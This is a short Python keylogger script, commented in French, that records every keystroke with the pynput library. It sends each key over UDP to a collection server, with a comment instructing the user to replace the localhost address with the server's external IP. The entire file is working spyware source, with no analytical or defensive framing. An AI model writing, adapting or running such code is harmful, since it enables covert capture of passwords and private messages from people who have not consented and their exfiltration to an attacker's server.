import socket
from pynput.keyboard import Listener

# définition de l'adresse du serveur auquel envoyer les données
# remplacer par l'ip externe du serveur
host = "127.0.0.1"

port = 8888
server = (host, port)

print("KEYLOGGER en marche!")

# création du socket : utilisation du protocole UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# définition de la fonction qui envoie les données au serveur
# et qui est appelée à chaque frappe de touche
def on_press(key):
    # convertit le nom de la touche appuyée en chaine de caractères avec l'encodage utf-8
    data = str(key).encode("utf-8")

    # on envoie la touche pressée au serveur
    sock.sendto(data, server)

# enregistrement de l'observateur de frappe
with Listener(on_press=on_press) as listener:
    listener.join()

